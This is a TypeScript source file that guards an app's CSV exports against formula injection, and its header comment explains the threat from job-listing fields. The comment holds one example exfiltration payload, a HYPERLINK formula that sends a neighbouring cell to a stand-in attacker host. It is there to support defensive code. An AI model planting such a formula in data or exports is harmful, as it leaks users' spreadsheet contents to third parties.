/**
 * CSV serialization for exports.
 *
 * WHY THIS FILE EXISTS
 * --------------------
 * Two exporters wrote their own CSV cell function — `src/tools/lib/exporters.ts`
 * (Budget Builder, Expense Tracker) and `src/careers/services/exports.ts`
 * (applications, companies, contacts, analytics). Both escaped quotes correctly
 * and both were vulnerable to the same thing: CSV formula injection (CWE-1236).
 *
 * Quoting a cell does NOT make it inert. A spreadsheet reads `"=1+1"` by first
 * stripping the CSV quoting, which yields `=1+1` — a formula, evaluated on open.
 * So the careful `replace(/"/g, '""')` both files already did was necessary for
 * a well-formed file and did nothing at all for safety.
 *
 * The exposure is not hypothetical, and it is not limited to a user attacking
 * their own spreadsheet. `applicationsTable` exports `company_name`,
 * `job_title`, `location` and `salary_text` — fields ingested from third-party
 * job APIs (Adzuna, JSearch, Remotive, Jooble). A listing whose company name is
 *
 *     =HYPERLINK("https://attacker.example/?d="&A1,"Salary details")
 *
 * travels through search, into the user's tracked applications, into the CSV
 * they export, and fires when they open it — exfiltrating neighbouring cells to
 * a third party. The money tools' exports are lower risk (a user's own
 * categories and notes) but reach the same place, and these files are made to
 * be shared: with an accountant, an advisor, a spouse.
 *
 * THE GUARD
 * ---------
 * A cell whose text begins with one of `= + - @`, TAB or CR is prefixed with a
 * single quote, which every major spreadsheet reads as "the rest of this is
 * literal text" and does not display as part of the value. This is the standard
 * OWASP mitigation and it is applied to STRINGS ONLY — a numeric cell is passed
 * through untouched, so `-50` stays the number −50 rather than becoming the text
 * `'-50` and breaking every total in the sheet.
 *
 * Quoting is minimal (RFC 4180): a cell is quoted only when it contains a
 * quote, comma or newline. That is what the Careers exporter already emitted,
 * and both exporters now agree on one format.
 */

/**
 * Characters that make a spreadsheet treat a cell as a formula rather than
 * text. TAB and CR are included because they are stripped on parse, exposing
 * whatever follows them to the same evaluation.
 */
const FORMULA_TRIGGERS = /^[\s]*[=+\-@\t\r]/;

/** Cells needing RFC 4180 quoting. */
const NEEDS_QUOTING = /[",\n\r]/;

/**
 * Defuse a string that a spreadsheet would otherwise evaluate.
 *
 * Exported so the guard is directly testable, and so any future exporter can
 * reach for the security primitive without re-deriving it.
 */
export function neutralizeFormula(value: string): string {
  return FORMULA_TRIGGERS.test(value) ? `'${value}` : value;
}

/**
 * One CSV cell: injection-guarded, then escaped and quoted if it needs it.
 *
 * `null`/`undefined` become an empty cell. Numbers are emitted bare — they
 * cannot carry a formula, and guarding them would turn every negative amount
 * into text.
 */
export function csvField(value: string | number | null | undefined): string {
  if (value == null) return '';
  if (typeof value === 'number') return String(value);
  const guarded = neutralizeFormula(value);
  return NEEDS_QUOTING.test(guarded) ? `"${guarded.replace(/"/g, '""')}"` : guarded;
}

/** A full CSV document from a matrix of rows. */
export function toCsv(rows: readonly (readonly (string | number | null | undefined)[])[]): string {
  return rows.map((row) => row.map(csvField).join(',')).join('\n');
}

/**
 * CSV as a UTF-8 blob with a BOM. Without the BOM Excel decodes the file as the
 * system codepage and every non-ASCII currency symbol (₹, €, ¥) arrives mangled.
 */
export function csvBlob(rows: readonly (readonly (string | number | null | undefined)[])[]): Blob {
  return new Blob(['﻿' + toCsv(rows)], { type: 'text/csv;charset=utf-8' });
}
